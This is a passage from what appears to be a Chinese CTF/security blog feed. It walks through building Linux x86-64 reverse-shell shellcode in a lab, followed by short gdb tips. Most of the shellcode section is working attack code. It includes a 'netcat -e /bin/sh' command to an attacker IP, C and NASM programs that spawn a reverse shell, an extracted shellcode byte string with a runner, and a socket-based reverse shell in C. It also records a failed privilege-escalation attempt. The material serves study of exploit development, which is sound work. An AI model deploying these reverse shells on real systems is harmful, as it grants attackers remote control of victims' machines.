- Dynamic null-free reverse TCP shell - 65 bytes</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-167.php">FreeBSD/x86 - reverse connect dl(shellcode) and execute, exit - 90 bytes</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-890.php">Linux/x86-64 - Password Protected Reverse Shell - 136 bytes</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-857.php">Linux/x86-64 - Reverse TCP shell - 118 bytes</a></p><p>​<a href="https://www.cnblogs.com/LittleHann/p/12038070.html">反弹Shell原理及检测技术研究 </a></p><p>​<a href="http://drops.xmd5.com/static/drops/tips-1376.html">使用netcat进行反弹链接的shellcode</a></p></blockquote><h3 id="51-先通过命令来反弹shell"><a class="markdownIt-Anchor" href="#51-先通过命令来反弹shell"></a> 5.1 先通过命令来反弹shell</h3><p>【1】先在攻击端（kali: 192.168.188.141）输入以下命令。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220817211511413.png" alt="image-20220817211511413"></p><p>【2】然后在靶机端（Kylin：192.168.188.146）输入以下命令。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220817211654594.png" alt="image-20220817211654594"></p><p>不过这种 shell 命令，在用execve中运行会找不到这个 <code>/dev/tcp/...</code> 文件，因此我们只能在靶机端运行 nc 命令：<code>netcat -e /bin/sh 192.168.188.141 5566</code></p><p>但是，如果你直接在 kylin 中运行上面这条命令的话，它会报错显示没有 -e 这条参数。这样就需要我们装一个完整的 netcat，然后再来执行上面这条命令。我将它安装在<code>/home/sakura/tools/netcat</code></p><blockquote><p>安装教程：<a href="https://www.freebuf.com/sectool/243115.html">这可能是netcat最全的使用指南</a></p></blockquote><h3 id="52-再来用c语言来试试可以运行"><a class="markdownIt-Anchor" href="#52-再来用c语言来试试可以运行"></a> 5.2 再来用C语言来试试：（可以运行）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;     </span><br><span class="line"><span class="type">char</span> *name[<span class="number">6</span>];</span><br><span class="line">name[<span class="number">0</span>] = <span class="string">&quot;/home/sakura/tools/netcat/src/netcat&quot;</span>;</span><br><span class="line">name[<span class="number">1</span>] = <span class="string">&quot;-e&quot;</span>;</span><br><span class="line"> name[<span class="number">2</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"> name[<span class="number">3</span>] = <span class="string">&quot;192.168.188.141&quot;</span>;</span><br><span class="line"> name[<span class="number">4</span>] = <span class="string">&quot;5566&quot;</span>;</span><br><span class="line">    name[<span class="number">5</span>] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ gcc -c rev_tcp.c -o rev_tcp.o</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ gcc rev_tcp.o -o rev_tcp -static</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ objdump -sd rev_tcp.o -M intel</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rev_tcp.o：     文件格式 elf64-x86-64</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Contents of section .text:</span></span><br><span class="line"><span class="comment"> 0000 f30f1efa 554889e5 4883ec40 64488b04  ....UH..H..@dH..</span></span><br><span class="line"><span class="comment"> 0010 25280000 00488945 f831c048 8d050000  %(...H.E.1.H....</span></span><br><span class="line"><span class="comment"> 0020 00004889 45c0488d 05000000 00488945  ..H.E.H......H.E</span></span><br><span class="line"><span class="comment"> 0030 c8488d05 00000000 488945d0 488d0500  .H......H.E.H...</span></span><br><span class="line"><span class="comment"> 0040 00000048 8945d848 8d050000 00004889  ...H.E.H......H.</span></span><br><span class="line"><span class="comment"> 0050 45e048c7 45e80000 0000488b 45c0488d  E.H.E.....H.E.H.</span></span><br><span class="line"><span class="comment"> 0060 4dc0ba00 00000048 89ce4889 c7e80000  M......H..H.....</span></span><br><span class="line"><span class="comment"> 0070 0000bf00 000000e8 00000000           ............    </span></span><br><span class="line"><span class="comment">Contents of section .rodata:</span></span><br><span class="line"><span class="comment"> 0000 2f686f6d 652f7361 6b757261 2f746f6f  /home/sakura/too</span></span><br><span class="line"><span class="comment"> 0010 6c732f6e 65746361 742f7372 632f6e65  ls/netcat/src/ne</span></span><br><span class="line"><span class="comment"> 0020 74636174 002d6500 2f62696e 2f736800  tcat.-e./bin/sh.</span></span><br><span class="line"><span class="comment"> 0030 3139322e 3136382e 3138382e 31343100  192.168.188.141.</span></span><br><span class="line"><span class="comment"> 0040 35353636 00                          5566.           </span></span><br><span class="line"><span class="comment">Contents of section .comment:</span></span><br><span class="line"><span class="comment"> 0000 00474343 3a202855 62756e74 7520392e  .GCC: (Ubuntu 9.</span></span><br><span class="line"><span class="comment"> 0010 332e302d 31306b79 6c696e32 2920392e  3.0-10kylin2) 9.</span></span><br><span class="line"><span class="comment"> 0020 332e3000                             3.0.            </span></span><br><span class="line"><span class="comment">Contents of section .note.gnu.property:</span></span><br><span class="line"><span class="comment"> 0000 04000000 10000000 05000000 474e5500  ............GNU.</span></span><br><span class="line"><span class="comment"> 0010 020000c0 04000000 03000000 00000000  ................</span></span><br><span class="line"><span class="comment">Contents of section .eh_frame:</span></span><br><span class="line"><span class="comment"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span></span><br><span class="line"><span class="comment"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span></span><br><span class="line"><span class="comment"> 0020 00000000 7c000000 00450e10 8602430d  ....|....E....C.</span></span><br><span class="line"><span class="comment"> 0030 06000000 00000000                    ........        </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Disassembly of section .text:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0000000000000000 &lt;main&gt;:</span></span><br><span class="line"><span class="comment">   0:f3 0f 1e fa          endbr64 </span></span><br><span class="line"><span class="comment">   4:55                   push   rbp</span></span><br><span class="line"><span class="comment">   5:48 89 e5             mov    rbp,rsp</span></span><br><span class="line"><span class="comment">   8:48 83 ec 40          sub    rsp,0x40</span></span><br><span class="line"><span class="comment">   c:64 48 8b 04 25 28 00 mov    rax,QWORD PTR fs:0x28</span></span><br><span class="line"><span class="comment">  13:00 00 </span></span><br><span class="line"><span class="comment">  15:48 89 45 f8          mov    QWORD PTR [rbp-0x8],rax</span></span><br><span class="line"><span class="comment">  19:31 c0                xor    eax,eax</span></span><br><span class="line"><span class="comment">  1b:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 22 &lt;main+0x22&gt;</span></span><br><span class="line"><span class="comment">  22:48 89 45 c0          mov    QWORD PTR [rbp-0x40],rax</span></span><br><span class="line"><span class="comment">  26:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 2d &lt;main+0x2d&gt;</span></span><br><span class="line"><span class="comment">  2d:48 89 45 c8          mov    QWORD PTR [rbp-0x38],rax</span></span><br><span class="line"><span class="comment">  31:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 38 &lt;main+0x38&gt;</span></span><br><span class="line"><span class="comment">  38:48 89 45 d0          mov    QWORD PTR [rbp-0x30],rax</span></span><br><span class="line"><span class="comment">  3c:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 43 &lt;main+0x43&gt;</span></span><br><span class="line"><span class="comment">  43:48 89 45 d8          mov    QWORD PTR [rbp-0x28],rax</span></span><br><span class="line"><span class="comment">  47:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 4e &lt;main+0x4e&gt;</span></span><br><span class="line"><span class="comment">  4e:48 89 45 e0          mov    QWORD PTR [rbp-0x20],rax</span></span><br><span class="line"><span class="comment">  52:48 c7 45 e8 00 00 00 mov    QWORD PTR [rbp-0x18],0x0</span></span><br><span class="line"><span class="comment">  59:00 </span></span><br><span class="line"><span class="comment">  5a:48 8b 45 c0          mov    rax,QWORD PTR [rbp-0x40]</span></span><br><span class="line"><span class="comment">  5e:48 8d 4d c0          lea    rcx,[rbp-0x40]</span></span><br><span class="line"><span class="comment">  62:ba 00 00 00 00       mov    edx,0x0</span></span><br><span class="line"><span class="comment">  67:48 89 ce             mov    rsi,rcx</span></span><br><span class="line"><span class="comment">  6a:48 89 c7             mov    rdi,rax</span></span><br><span class="line"><span class="comment">  6d:e8 00 00 00 00       call   72 &lt;main+0x72&gt;</span></span><br><span class="line"><span class="comment">  72:bf 00 00 00 00       mov    edi,0x0</span></span><br><span class="line"><span class="comment">  77:e8 00 00 00 00       call   7c &lt;main+0x7c&gt;</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="53-然后我们用汇编来写-execve-调用"><a class="markdownIt-Anchor" href="#53-然后我们用汇编来写-execve-调用"></a> 5.3 然后我们用汇编来写 execve 调用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">;execve(&quot;/home/sakura/tools/netcat/src/netcat&quot;, [&quot;/home/sakura/tools/netcat/src/ne&quot;..., &quot;-e&quot;, &quot;/bin/sh&quot;, &quot;192.168.188.141&quot;, &quot;5566&quot;], NULL) = 0</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 0x40</span><br><span class="line">    mov qword rax, &#x27;5566AAAA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;188.141A&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;192.168.&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;/bin/shA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;tcatA-eA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;t/src/ne&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;ls/netca&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;kura/too&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;/home/sa&#x27;</span><br><span class="line">push rax</span><br><span class="line">    </span><br><span class="line">    xor byte [rsp+36], 0x41</span><br><span class="line">   xor byte [rsp+39], 0x41</span><br><span class="line">   xor byte [rsp+47], 0x41</span><br><span class="line">   xor byte [rsp+63], 0x41</span><br><span class="line">    xor byte [rsp+71], 0x41</span><br><span class="line">    xor byte [rsp+70], 0x41</span><br><span class="line">    xor byte [rsp+69], 0x41</span><br><span class="line">    xor byte [rsp+68], 0x41</span><br><span class="line"></span><br><span class="line">xor rax, rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">push rax</span><br><span class="line">lea rbx, [rdi+64]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+48]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+40]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+37]</span><br><span class="line">push rbx</span><br><span class="line">push rdi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor rdx, rdx </span><br><span class="line"></span><br><span class="line">   add al , 59</span><br><span class="line">   syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">;/home/sa kura/too ls/netca t/src/ne tcatAAAA </span><br><span class="line">;-eAAAAAA /bin/shA 192.168. 188.141A 5566AAAA&quot;</span><br><span class="line">    </span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">akura@Kylin:~/文档/execveDir$ nasm -f elf64 rev_tcp.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 rev_tcp.o -o rev_tcp</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rev_tcp</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d rev_tcp.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x55\x48\x89\xe5\x48\x83\xec\x40\x48\xb8\x35\x35\x36\x36\x41\x41\x41\x41\x50\x48\xb8\x31\x38\x38\x2e\x31\x34\x31\x41\x50\x48\xb8\x31\x39\x32\x2e\x31\x36\x38\x2e\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x41\x50\x48\xb8\x74\x63\x61\x74\x41\x2d\x65\x41\x50\x48\xb8\x74\x2f\x73\x72\x63\x2f\x6e\x65\x50\x48\xb8\x6c\x73\x2f\x6e\x65\x74\x63\x61\x50\x48\xb8\x6b\x75\x72\x61\x2f\x74\x6f\x6f\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x61\x50\x80\x74\x24\x24\x41\x80\x74\x24\x27\x41\x80\x74\x24\x2f\x41\x80\x74\x24\x3f\x41\x80\x74\x24\x47\x41\x80\x74\x24\x46\x41\x80\x74\x24\x45\x41\x80\x74\x24\x44\x41\x48\x31\xc0\x48\x89\xe7\x50\x48\x8d\x5f\x40\x53\x48\x8d\x5f\x30\x53\x48\x8d\x5f\x28\x53\x48\x8d\x5f\x25\x53\x57\x48\x89\xe6\x48\x31\xd2\x04\x3b\x0f\x05&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc rev_tcp.c -o rev_tcp -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rev_tcp</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3 id="54-用系统调用建立连接来反弹shell"><a class="markdownIt-Anchor" href="#54-用系统调用建立连接来反弹shell"></a> 5.4 用系统调用建立连接来反弹shell</h3><blockquote><p>这种方法似乎绕不过 iptable，不建议使用。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span>   <span class="comment">//构造socket所需的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span>  <span class="comment">//定义sockaddr结构</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *shell[<span class="number">2</span>];       <span class="comment">//用于execv调用</span></span><br><span class="line">  <span class="type">int</span> soc,remote;    <span class="comment">//文件描述符句柄</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span> <span class="comment">//保存IP/端口值的结构</span></span><br><span class="line"> <span class="comment">//192.168.188.141--&gt;0x8dbca8c0</span></span><br><span class="line">  serv_addr.sin_addr.s_addr=<span class="number">0x8dbca8c0</span>;  <span class="comment">//将socket的地址设置为所有本地地址</span></span><br><span class="line">  serv_addr.sin_port=<span class="number">0x15be</span>;  <span class="comment">//设置socket的端口5566</span></span><br><span class="line">  serv_addr.sin_family=<span class="number">2</span>;   <span class="comment">//设置协议族：IP</span></span><br><span class="line">  soc=socket(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">  remote=connect(soc,(<span class="keyword">struct</span> sockaddr *)&amp;serv_addr,<span class="number">0x10</span>);</span><br><span class="line"> </span><br><span class="line">  dup2(soc,<span class="number">0</span>);   <span class="comment">//将stdin连接client</span></span><br><span class="line">  dup2(soc,<span class="number">1</span>);   <span class="comment">//将stdout连接client</span></span><br><span class="line">  dup2(soc,<span class="number">2</span>);   <span class="comment">//将strderr连接到client</span></span><br><span class="line">  shell[<span class="number">0</span>]=<span class="string">&quot;/bin/sh&quot;</span>;   <span class="comment">//execve的第一个参数</span></span><br><span class="line">  shell[<span class="number">1</span>]=<span class="number">0</span>;           <span class="comment">//数组的第二个元素为NULL,表示数组结束</span></span><br><span class="line">  execv(shell[<span class="number">0</span>],shell,<span class="literal">NULL</span>);   <span class="comment">//建立一个shell</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-提权"><a class="markdownIt-Anchor" href="#6-提权"></a> 6 提权</h2><blockquote><p>参考：</p><p>​<a href="http://c.biancheng.net/view/761.html">Linux chown命令：修改文件和目录的所有者和所属组</a></p><p>​<a href="https://blog.csdn.net/y26183225/article/details/80366394">出现 “ /usr/bin/ld: cannot open output file a.out: Permission denied ” 的解决办法</a></p><p>​<a href="https://www.ibm.com/docs/en/cics-tx/11.1?topic=troubleshooting-resolving-linker-error-permission-denied">解决链接器错误 - 权限被拒绝</a></p><p>​</p></blockquote><p>前面不是说了一种提权思路吗？</p><blockquote><p>提权思路：在系统文件中找到一个具有777权限的文件，在里面写入我们的提权代码执行，或者是把我们的可执行文件，提升权限执行。</p></blockquote><p>我在实现的时候，却发现，只有777权限还不行，提示权限不够。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220821180910343.png" alt="image-20220821180910343"></p><p>按照这篇文章《<a href="https://blog.csdn.net/y26183225/article/details/80366394">出现 “ /usr/bin/ld: cannot open output file a.out: Permission denied ” 的解决办法</a>》所说这是因为，user 用户无权更改所有者为 root 用户文件。所以我们还需要更改文件的所有者。<a href="http://c.biancheng.net/view/761.html">Linux chown命令：修改文件和目录的所有者和所属组</a></p><p>但是更改文件所有者，还是需要 root 权限。更改后，，，还是缺少权限。</p><p>结果我按照那篇文章的说法，把整个目录的所有者都改成了 sakura，然后就能成功编译了。但是还是无法执行，因为目录中的所有文件所有者都变成了 sakura，所以同时文件的所有者也变成了 sakura。</p><p>最后，我看到了这篇文章《<a href="https://www.ibm.com/docs/en/cics-tx/11.1?topic=troubleshooting-resolving-linker-error-permission-denied">解决链接器错误 - 权限被拒绝</a>》，说是要解决此问题，请确保程序编译所在的目录具有所需的写入权限。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220821192140988.png" alt="image-20220821192140988"></p><p>strace 跟踪还是缺少权限。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220821201609541.png" alt="image-20220821201609541"></p><p>无法解决。。。</p><p>如有大佬知道怎么提权，请教教我这个菜鸟吧！<br><mark>联系我QQ：918442089，微信：H918442089</mark></p><blockquote><p>参考：</p><p>​<a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall/index.html#linux-x86_64%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%AE%80%E4%BB%8B">Linux x86_64系统调用简介</a></p><p>​<a href="https://syscalls.w3challs.com/?arch=x86_64">syscall大全</a></p><p>​<a href="http://www.shell-storm.org/shellcode/">Shellcodes database for study cases</a></p><p>​<a href="https://www.exploit-db.com/shellcodes">Exploit Database Shellcodes</a></p><p>​《UNIX环境高级编程第3版》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-打开-terminal&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-打开-terminal&quot;&gt;&lt;/a&gt; 1. 打开 terminal&lt;/h2&gt;
&lt;p&gt;首先我们来试试最经典的例子 ---- 打开 ter</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>gdb显示intel和at&amp;t汇编</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/</id>
    <published>2022-08-08T14:36:22.000Z</published>
    <updated>2022-08-08T14:38:19.182Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://blog.csdn.net/freezing111/article/details/70576865">Linux下gdb显示intel和at&amp;t汇编</a></p><p>在windows下使用习惯了intel汇编，在Linux下看的难受，在gdb下使用</p><p>set disassembly-flavor intel 转换为intel格式的汇编</p><p>set disassembly-flavor att 转换为att格式的汇编</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://blog.csdn.net/freezing111/article/details/70576865&quot;&gt;Linux下gdb显示intel和at&amp;amp;t汇编&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在windows下使用习惯了intel汇编，在</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>gdb调试带参程序</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-08-08T14:33:41.000Z</published>
    <updated>2022-08-08T14:36:56.316Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://www.cnblogs.com/rosesmall/archive/2012/04/10/2440514.html">gdb调试带参数程序</a></p><p><strong>具体来说就是</strong></p><p><strong>例如一个程序名为prog 参数为 -l a -C abc<br>则，运行gcc/g++ -g prog.c/cpp -o prog</strong></p><p><strong>就可以用gdb调试程序prog<br>#gdb prog</strong></p><p><strong>进入gdb调试界面</strong></p><p><strong>输入参数命令set args 后面加上程序所要用的参数，注意，不再带有程序名，直接加参数，如：<br>set args -l a -C abc</strong></p><p><strong>回车后输入</strong></p><p><strong>r</strong></p><p><strong>即可开始</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.cnblogs.com/rosesmall/archive/2012/04/10/2440514.html&quot;&gt;gdb调试带参数程序&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;具体来说就是&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;s</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>gdb插件自动切换</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/</id>
    <published>2022-08-08T14:31:58.000Z</published>
    <updated>2022-08-08T14:49:08.833Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://www.cnblogs.com/welhzh/p/13958736.html">gdb 的配置、插件plugin与多彩显示 </a></p><p>PwnDbg、gef、peda 的自动切换，其实就是切换配置文件：</p><p>先把他们全部装上，当然你可以选择自己感兴趣的安装，他们的配置都需要通过 ~/.gdbinit 来配置，因此他们是互斥的，配置里只能配置一种，但是可以用下面的这种方法解决，下面的示例只写了 peda、PwnDbg和gef，其它自己加。</p><p>1、Open your .gdbinit file, delete any contents and paste the following configuration:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">define init-peda</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">end</span><br><span class="line">document init-peda</span><br><span class="line">Initializes the PEDA (Python Exploit Development Assistant for GDB) framework</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-pwndbg</span><br><span class="line">source 